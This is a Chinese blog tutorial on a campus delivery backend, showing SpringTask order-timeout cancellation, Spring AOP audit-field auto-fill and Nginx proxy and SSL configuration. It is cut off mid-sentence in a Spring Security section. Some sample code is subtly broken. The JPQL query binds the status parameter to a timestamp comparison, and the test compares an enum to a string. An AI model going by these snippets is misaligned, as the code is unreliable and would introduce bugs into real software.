SpringTask订单超时自动取消</strong></h2><p>在 <strong>校园闪送</strong> 项目中，使用 <strong>SpringTask</strong> 实现订单超时自动取消功能的场景和具体实现如下：</p><h3 id="1-使用场景"><a href="#1-使用场景" class="headerlink" title="1. 使用场景"></a><strong>1. 使用场景</strong></h3><p>在校园闪送系统中，用户下单后需要在一定时间内完成支付。如果订单在规定时间（如30分钟）内未支付，则需要自动取消订单，释放库存资源，避免资源被长时间占用。这种功能在电商平台、在线订票系统和预约系统中非常常见。</p><h3 id="2-为什么使用-SpringTask"><a href="#2-为什么使用-SpringTask" class="headerlink" title="2. 为什么使用 SpringTask"></a><strong>2. 为什么使用 SpringTask</strong></h3><ul><li><strong>定时任务的灵活性</strong>：SpringTask 提供了灵活的定时任务配置，可以轻松实现周期性检查订单状态。</li><li><strong>轻量级和易于集成</strong>：SpringTask 是 Spring Boot 提供的内置定时任务解决方案，无需额外的依赖，与 Spring 生态系统无缝集成。</li><li><strong>性能优化</strong>：通过定时任务，可以减少对数据库的频繁查询，优化系统性能。</li></ul><h3 id="3-具体实现方法-1"><a href="#3-具体实现方法-1" class="headerlink" title="3. 具体实现方法"></a><strong>3. 具体实现方法</strong></h3><h4 id="1-创建订单取消服务"><a href="#1-创建订单取消服务" class="headerlink" title="(1) 创建订单取消服务"></a><strong>(1) 创建订单取消服务</strong></h4><p>创建一个服务类 <code>OrderCancellationService</code>，用于处理订单的自动取消逻辑。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Service</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderCancellationService</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> OrderRepository orderRepository;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cancelOrdersAfterTimeout</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">cutoffTime</span> <span class="hljs-operator">=</span> LocalDateTime.now().minusMinutes(<span class="hljs-number">30</span>); <span class="hljs-comment">// 设置30分钟的超时时间</span><br>        List&lt;Order&gt; pendingOrders = orderRepository.findByStatusAndCreatedAtBefore(<br>                OrderStatus.PENDING_PAYMENT, cutoffTime);<br><br>        <span class="hljs-keyword">for</span> (Order order : pendingOrders) &#123;<br>            order.setStatus(OrderStatus.CANCELLED); <span class="hljs-comment">// 更新订单状态为已取消</span><br>            orderRepository.save(order);<br>            System.out.println(<span class="hljs-string">&quot;Order &quot;</span> + order.getId() + <span class="hljs-string">&quot; is cancelled due to timeout.&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-配置定时任务"><a href="#2-配置定时任务" class="headerlink" title="(2) 配置定时任务"></a><strong>(2) 配置定时任务</strong></h4><p>使用 <code>@Scheduled</code> 注解配置定时任务，周期性地调用订单取消服务。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-meta">@EnableScheduling</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ScheduledTasks</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> OrderCancellationService orderCancellationService;<br><br>    <span class="hljs-meta">@Scheduled(fixedRate = 60000)</span> <span class="hljs-comment">// 每分钟执行一次</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cancelPendingOrders</span><span class="hljs-params">()</span> &#123;<br>        orderCancellationService.cancelOrdersAfterTimeout();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="3-数据库查询方法"><a href="#3-数据库查询方法" class="headerlink" title="(3) 数据库查询方法"></a><strong>(3) 数据库查询方法</strong></h4><p>在 <code>OrderRepository</code> 中，添加一个方法用于查询未支付且超时的订单。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">OrderRepository</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">JpaRepository</span>&lt;Order, Long&gt; &#123;<br><br>    <span class="hljs-meta">@Query(&quot;SELECT o FROM Order o WHERE o.status = &#x27;PENDING_PAYMENT&#x27; AND o.createdAt &lt; ?1&quot;)</span><br>    List&lt;Order&gt; <span class="hljs-title function_">findByStatusAndCreatedAtBefore</span><span class="hljs-params">(OrderStatus status, LocalDateTime cutoffTime)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="4-测试代码"><a href="#4-测试代码" class="headerlink" title="(4) 测试代码"></a><strong>(4) 测试代码</strong></h4><p>使用 Spring Boot Test 和 H2 数据库来测试订单超时自动取消的功能。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@SpringBootTest</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderCancellationTaskTest</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> OrderRepository orderRepository;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> OrderCancellationService orderCancellationService;<br><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testCancelUnpaidOrders</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// 创建一个超时未支付的订单</span><br>        <span class="hljs-type">Order</span> <span class="hljs-variable">unpaidOrder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Order</span>(<span class="hljs-string">&quot;PENDING_PAYMENT&quot;</span>, LocalDateTime.now().minusMinutes(<span class="hljs-number">31</span>));<br>        orderRepository.save(unpaidOrder);<br><br>        <span class="hljs-comment">// 执行订单取消任务</span><br>        orderCancellationService.cancelOrdersAfterTimeout();<br><br>        <span class="hljs-comment">// 检查订单是否被取消</span><br>        <span class="hljs-type">Order</span> <span class="hljs-variable">fetchedOrder</span> <span class="hljs-operator">=</span> orderRepository.findById(unpaidOrder.getId()).orElse(<span class="hljs-literal">null</span>);<br>        assertThat(fetchedOrder).isNotNull();<br>        assertThat(fetchedOrder.getStatus()).isEqualTo(<span class="hljs-string">&quot;CANCELLED&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a><strong>4. 总结</strong></h3><p>通过使用 <strong>SpringTask</strong> 实现订单超时自动取消功能，可以有效管理未支付的订单，释放库存资源，提升用户体验。具体实现包括：</p><ol><li>创建订单取消服务，查询并取消超时未支付的订单。</li><li>配置定时任务，周期性地调用订单取消服务。</li><li>在数据库中查询超时未支付的订单。</li><li>使用测试代码验证功能的正确性。</li></ol><hr><h2 id="5-AOP字段自动填充"><a href="#5-AOP字段自动填充" class="headerlink" title="5. AOP字段自动填充"></a><strong>5. AOP字段自动填充</strong></h2><p>在 <strong>校园闪送</strong> 项目中，使用 <strong>Spring AOP</strong> 实现字段自动填充的场景主要是为了简化开发流程，避免在每个业务逻辑中重复编写公共字段的赋值代码。具体实现步骤如下：</p><h3 id="1-使用场景-1"><a href="#1-使用场景-1" class="headerlink" title="1. 使用场景"></a><strong>1. 使用场景</strong></h3><p>在校园闪送系统中，许多实体对象（如订单、用户、菜品等）都包含一些公共字段，例如：</p><ul><li><strong>创建时间（create_time）</strong></li><li><strong>创建人（create_user）</strong></li><li><strong>更新时间（update_time）</strong></li><li><strong>更新人（update_user）</strong></li></ul><p>这些字段在新增和更新数据时需要被自动填充。手动编写这些字段的赋值代码不仅繁琐，还容易出错。因此，通过 <strong>Spring AOP</strong> 实现字段自动填充可以显著减少重复代码，提高开发效率。</p><h3 id="2-具体实现步骤"><a href="#2-具体实现步骤" class="headerlink" title="2. 具体实现步骤"></a><strong>2. 具体实现步骤</strong></h3><h4 id="1-自定义注解-AutoFill"><a href="#1-自定义注解-AutoFill" class="headerlink" title="(1) 自定义注解 AutoFill"></a><strong>(1) 自定义注解 <code>AutoFill</code></strong></h4><p>创建一个自定义注解 <code>AutoFill</code>，用于标识需要进行字段自动填充的方法。注解中包含一个枚举值，用于区分数据库操作类型（如 <code>INSERT</code> 或 <code>UPDATE</code>）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.annotation;<br><br><span class="hljs-keyword">import</span> com.example.enumeration.OperationType;<br><span class="hljs-keyword">import</span> java.lang.annotation.ElementType;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.annotation.RetentionPolicy;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><br><span class="hljs-meta">@Target(ElementType.METHOD)</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> AutoFill &#123;<br>    OperationType <span class="hljs-title function_">value</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-自定义切面类-AutoFillAspect"><a href="#2-自定义切面类-AutoFillAspect" class="headerlink" title="(2) 自定义切面类 AutoFillAspect"></a><strong>(2) 自定义切面类 <code>AutoFillAspect</code></strong></h4><p>创建一个切面类 <code>AutoFillAspect</code>，用于统一拦截加入了 <code>AutoFill</code> 注解的方法，并通过反射为公共字段赋值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.aspect;<br><br><span class="hljs-keyword">import</span> com.example.annotation.AutoFill;<br><span class="hljs-keyword">import</span> com.example.constant.AutoFillConstant;<br><span class="hljs-keyword">import</span> com.example.enumeration.OperationType;<br><span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;<br><span class="hljs-keyword">import</span> org.aspectj.lang.JoinPoint;<br><span class="hljs-keyword">import</span> org.aspectj.lang.annotation.Aspect;<br><span class="hljs-keyword">import</span> org.aspectj.lang.annotation.Before;<br><span class="hljs-keyword">import</span> org.aspectj.lang.annotation.Pointcut;<br><span class="hljs-keyword">import</span> org.aspectj.lang.reflect.MethodSignature;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Component;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.time.LocalDateTime;<br><br><span class="hljs-meta">@Aspect</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-meta">@Slf4j</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AutoFillAspect</span> &#123;<br><br>    <span class="hljs-meta">@Pointcut(&quot;execution(* com.example.mapper.*.*(..)) &amp;&amp; @annotation(com.example.annotation.AutoFill)&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">autoFillPointCut</span><span class="hljs-params">()</span> &#123;&#125;<br><br>    <span class="hljs-meta">@Before(&quot;autoFillPointCut()&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">autoFill</span><span class="hljs-params">(JoinPoint joinPoint)</span> &#123;<br>        <span class="hljs-type">MethodSignature</span> <span class="hljs-variable">signature</span> <span class="hljs-operator">=</span> (MethodSignature) joinPoint.getSignature();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> signature.getMethod();<br>        <span class="hljs-type">AutoFill</span> <span class="hljs-variable">autoFill</span> <span class="hljs-operator">=</span> method.getAnnotation(AutoFill.class);<br>        <span class="hljs-type">OperationType</span> <span class="hljs-variable">operationType</span> <span class="hljs-operator">=</span> autoFill.value();<br><br>        Object[] args = joinPoint.getArgs();<br>        <span class="hljs-keyword">if</span> (args == <span class="hljs-literal">null</span> || args.length == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">entity</span> <span class="hljs-operator">=</span> args[<span class="hljs-number">0</span>];<br>        <span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">now</span> <span class="hljs-operator">=</span> LocalDateTime.now();<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (operationType == OperationType.INSERT) &#123;<br>                <span class="hljs-type">Method</span> <span class="hljs-variable">setCreateTime</span> <span class="hljs-operator">=</span> entity.getClass().getDeclaredMethod(AutoFillConstant.SET_CREATE_TIME, LocalDateTime.class);<br>                <span class="hljs-type">Method</span> <span class="hljs-variable">setCreateUser</span> <span class="hljs-operator">=</span> entity.getClass().getDeclaredMethod(AutoFillConstant.SET_CREATE_USER, Long.class);<br>                <span class="hljs-type">Method</span> <span class="hljs-variable">setUpdateTime</span> <span class="hljs-operator">=</span> entity.getClass().getDeclaredMethod(AutoFillConstant.SET_UPDATE_TIME, LocalDateTime.class);<br>                <span class="hljs-type">Method</span> <span class="hljs-variable">setUpdateUser</span> <span class="hljs-operator">=</span> entity.getClass().getDeclaredMethod(AutoFillConstant.SET_UPDATE_USER, Long.class);<br><br>                setCreateTime.invoke(entity, now);<br>                setCreateUser.invoke(entity, getCurrentUserId());<br>                setUpdateTime.invoke(entity, now);<br>                setUpdateUser.invoke(entity, getCurrentUserId());<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (operationType == OperationType.UPDATE) &#123;<br>                <span class="hljs-type">Method</span> <span class="hljs-variable">setUpdateTime</span> <span class="hljs-operator">=</span> entity.getClass().getDeclaredMethod(AutoFillConstant.SET_UPDATE_TIME, LocalDateTime.class);<br>                <span class="hljs-type">Method</span> <span class="hljs-variable">setUpdateUser</span> <span class="hljs-operator">=</span> entity.getClass().getDeclaredMethod(AutoFillConstant.SET_UPDATE_USER, Long.class);<br><br>                setUpdateTime.invoke(entity, now);<br>                setUpdateUser.invoke(entity, getCurrentUserId());<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            log.error(<span class="hljs-string">&quot;Error during auto-fill operation&quot;</span>, e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> Long <span class="hljs-title function_">getCurrentUserId</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// 获取当前登录用户ID的逻辑</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1L</span>; <span class="hljs-comment">// 示例</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="3-在-Mapper-方法上加入-AutoFill-注解"><a href="#3-在-Mapper-方法上加入-AutoFill-注解" class="headerlink" title="(3) 在 Mapper 方法上加入 AutoFill 注解"></a><strong>(3) 在 Mapper 方法上加入 <code>AutoFill</code> 注解</strong></h4><p>在需要进行字段自动填充的 Mapper 方法上加入 <code>AutoFill</code> 注解，指定操作类型。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.mapper;<br><br><span class="hljs-keyword">import</span> com.example.annotation.AutoFill;<br><span class="hljs-keyword">import</span> com.example.enumeration.OperationType;<br><span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Mapper;<br><br><span class="hljs-meta">@Mapper</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">OrderMapper</span> &#123;<br>    <span class="hljs-meta">@AutoFill(OperationType.INSERT)</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertOrder</span><span class="hljs-params">(Order order)</span>;<br><br>    <span class="hljs-meta">@AutoFill(OperationType.UPDATE)</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateOrder</span><span class="hljs-params">(Order order)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-其他实现方法"><a href="#3-其他实现方法" class="headerlink" title="3. 其他实现方法"></a><strong>3. 其他实现方法</strong></h3><p>除了使用 <strong>Spring AOP</strong>，还可以通过以下方法实现字段自动填充：</p><ul><li><strong>MyBatis Plus</strong>：MyBatis Plus 提供了内置的字段自动填充功能，通过在实体类中定义 <code>@TableField</code> 注解，并设置 <code>fill</code> 属性，可以实现类似的功能。</li><li><strong>数据库触发器</strong>：在数据库层面使用触发器，在数据插入或更新时自动填充字段。这种方法不依赖于应用代码，但需要在数据库中进行配置。</li></ul><h3 id="4-总结-1"><a href="#4-总结-1" class="headerlink" title="4. 总结"></a><strong>4. 总结</strong></h3><p>通过 <strong>Spring AOP</strong> 实现字段自动填充，可以显著减少重复代码，提高开发效率。具体实现包括：</p><ol><li>创建自定义注解 <code>AutoFill</code>，用于标识需要自动填充的方法。</li><li>创建切面类 <code>AutoFillAspect</code>，通过反射为公共字段赋值。</li><li>在 Mapper 方法上加入 <code>AutoFill</code> 注解，指定操作类型。</li></ol><h2 id="这种方法不仅适用于校园闪送项目，还可以广泛应用于其他需要字段自动填充的场景。"><a href="#这种方法不仅适用于校园闪送项目，还可以广泛应用于其他需要字段自动填充的场景。" class="headerlink" title="这种方法不仅适用于校园闪送项目，还可以广泛应用于其他需要字段自动填充的场景。"></a>这种方法不仅适用于校园闪送项目，还可以广泛应用于其他需要字段自动填充的场景。</h2><h2 id="6-使用-Nginx-配置反向代理与负载均衡"><a href="#6-使用-Nginx-配置反向代理与负载均衡" class="headerlink" title="6. 使用 Nginx 配置反向代理与负载均衡"></a><strong>6. 使用 Nginx 配置反向代理与负载均衡</strong></h2><h3 id="为什么在项目中使用-Nginx-配置反向代理与负载均衡？"><a href="#为什么在项目中使用-Nginx-配置反向代理与负载均衡？" class="headerlink" title="为什么在项目中使用 Nginx 配置反向代理与负载均衡？"></a><strong>为什么在项目中使用 Nginx 配置反向代理与负载均衡？</strong></h3><h4 id="1-使用场景-2"><a href="#1-使用场景-2" class="headerlink" title="1. 使用场景"></a><strong>1. 使用场景</strong></h4><p>在 <strong>校园闪送</strong> 项目中，Nginx 配置反向代理与负载均衡的场景主要包括以下几点：</p><ul><li><strong>前后端分离</strong>：前端和后端服务部署在不同的服务器上，需要通过一个统一的入口（如域名）访问后端服务。</li><li><strong>高并发处理</strong>：系统需要处理大量用户请求，通过负载均衡将请求分发到多个后端服务器，提高系统的并发处理能力。</li><li><strong>跨域问题</strong>：前端和后端服务可能部署在不同的域名或端口上，Nginx 可以通过反向代理解决跨域问题。</li><li><strong>安全性增强</strong>：通过 Nginx 提供 SSL&#x2F;TLS 加密，确保数据传输的安全。</li></ul><h4 id="2-具体实现方法"><a href="#2-具体实现方法" class="headerlink" title="2. 具体实现方法"></a><strong>2. 具体实现方法</strong></h4><h5 id="1-配置反向代理"><a href="#1-配置反向代理" class="headerlink" title="(1) 配置反向代理"></a><strong>(1) 配置反向代理</strong></h5><p>反向代理允许客户端通过一个统一的入口访问后端服务，隐藏后端服务的细节。以下是 Nginx 配置反向代理的基本步骤：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;  <span class="hljs-comment"># 监听端口</span><br>    <span class="hljs-attribute">server_name</span> example.com;  <span class="hljs-comment"># 域名</span><br><br>    <span class="hljs-section">location</span> / &#123;<br>        <span class="hljs-attribute">proxy_pass</span> http://backend_server;  <span class="hljs-comment"># 后端服务地址</span><br>        <span class="hljs-attribute">proxy_set_header</span> Host <span class="hljs-variable">$host</span>;  <span class="hljs-comment"># 传递原始 Host 头部</span><br>        <span class="hljs-attribute">proxy_set_header</span> X-Real-IP <span class="hljs-variable">$remote_addr</span>;  <span class="hljs-comment"># 传递客户端真实 IP</span><br>        <span class="hljs-attribute">proxy_set_header</span> X-Forwarded-For <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;  <span class="hljs-comment"># 传递转发的 IP</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在上述配置中，<code>proxy_pass</code> 指定了后端服务的地址，<code>proxy_set_header</code> 用于传递客户端的真实信息。</p><h5 id="2-配置负载均衡"><a href="#2-配置负载均衡" class="headerlink" title="(2) 配置负载均衡"></a><strong>(2) 配置负载均衡</strong></h5><p>负载均衡可以将请求分发到多个后端服务器，提高系统的可用性和性能。以下是 Nginx 配置负载均衡的基本步骤：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">http</span> &#123;<br>    <span class="hljs-section">upstream</span> backend_servers &#123;<br>        <span class="hljs-attribute">server</span> backend1.example.com;  <span class="hljs-comment"># 后端服务器1</span><br>        <span class="hljs-attribute">server</span> backend2.example.com;  <span class="hljs-comment"># 后端服务器2</span><br>        <span class="hljs-attribute">server</span> backend3.example.com;  <span class="hljs-comment"># 后端服务器3</span><br>    &#125;<br><br>    <span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br>        <span class="hljs-attribute">server_name</span> example.com;<br><br>        <span class="hljs-section">location</span> / &#123;<br>            <span class="hljs-attribute">proxy_pass</span> http://backend_servers;  <span class="hljs-comment"># 使用负载均衡的后端服务器</span><br>            <span class="hljs-attribute">proxy_set_header</span> Host <span class="hljs-variable">$host</span>;<br>            <span class="hljs-attribute">proxy_set_header</span> X-Real-IP <span class="hljs-variable">$remote_addr</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在上述配置中，<code>upstream</code> 块定义了一个后端服务器池，<code>proxy_pass</code> 指定了负载均衡的后端服务器。</p><h5 id="3-均衡算法"><a href="#3-均衡算法" class="headerlink" title="(3) 均衡算法"></a><strong>(3) 均衡算法</strong></h5><p>Nginx 提供了多种负载均衡算法，可以根据实际需求选择：</p><ul><li><strong>轮询（默认）</strong>：按照顺序逐一分配请求到后端服务器。</li><li><strong>最少连接</strong>：优先将请求分配给当前连接数最少的后端服务器。</li><li><strong>IP 哈希</strong>：根据客户端 IP 的哈希值固定分配后端服务器，适用于需要会话保持的场景。</li></ul><h5 id="4-SSL-x2F-TLS-配置"><a href="#4-SSL-x2F-TLS-配置" class="headerlink" title="(4) SSL&#x2F;TLS 配置"></a><strong>(4) SSL&#x2F;TLS 配置</strong></h5><p>为了确保数据传输的安全，可以配置 Nginx 提供 SSL&#x2F;TLS 加密：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">443</span> ssl;  <span class="hljs-comment"># 监听 HTTPS 端口</span><br>    <span class="hljs-attribute">server_name</span> example.com;<br><br>    <span class="hljs-attribute">ssl_certificate</span> /path/to/cert.pem;  <span class="hljs-comment"># SSL 证书路径</span><br>    <span class="hljs-attribute">ssl_certificate_key</span> /path/to/key.pem;  <span class="hljs-comment"># SSL 私钥路径</span><br><br>    <span class="hljs-section">location</span> / &#123;<br>        <span class="hljs-attribute">proxy_pass</span> http://backend_servers;<br>        <span class="hljs-attribute">proxy_set_header</span> Host <span class="hljs-variable">$host</span>;<br>        <span class="hljs-attribute">proxy_set_header</span> X-Real-IP <span class="hljs-variable">$remote_addr</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在上述配置中，<code>ssl_certificate</code> 和 <code>ssl_certificate_key</code> 指定了 SSL 证书和私钥的路径。</p><h3 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a><strong>总结</strong></h3><p>通过使用 Nginx 配置反向代理与负载均衡，可以实现以下目标：</p><ol><li><strong>前后端分离</strong>：提供统一的访问入口，隐藏后端服务细节。</li><li><strong>高并发处理</strong>：通过负载均衡将请求分发到多个后端服务器，提高系统的并发处理能力。</li><li><strong>跨域问题</strong>：解决前端和后端服务部署在不同域名或端口上的跨域问题。</li><li><strong>安全性增强</strong>：通过 SSL&#x2F;TLS 加密，确保数据传输的安全。</li></ol><h2 id="7-数据安全与权限校验"><a href="#7-数据安全与权限校验" class="headerlink" title="7. 数据安全与权限校验"></a><strong>7. 数据安全与权限校验</strong></h2><p>在 <strong>校园闪送</strong> 项目中，数据安全与权限校验是确保系统稳定运行和保护用户隐私的关键环节。以下是具体的应用场景和实现方法：</p><h3 id="1-使用场景-3"><a href="#1-使用场景-3" class="headerlink" title="1. 使用场景"></a><strong>1. 使用场景</strong></h3><ul><li><strong>用户数据保护</strong>：确保用户信息（如订单、个人信息等）只能被授权用户访问。</li><li><strong>操作权限控制</strong>：限制用户只能执行其角色允许的操作，例如商家只能管理自己的菜品和订单，用户只能查看自己的订单。</li><li><strong>防止越权访问</strong>：防止用户通过非法手段访问不属于自己的数据或执行未授权的操作。</li></ul><h3 id="2-实现方法"><a href="#2-实现方法" class="headerlink" title="2. 实现方法"></a><strong>2. 实现方法</strong></h3><h4 id="1-使用-Spring-Security-进行权限校验"><a href="#1-使用-Spring-Security-进行权限校验" class="headerlink" title="(1) 使用 Spring Security 进行权限校验"></a><strong>(1) 使用 Spring Security 进行权限校验</strong></h4><p>Spring Security 是一个强大的安全框架，可以方便地实现认证和授权功能。</p><ul><li><p><strong>添加依赖</strong>：在 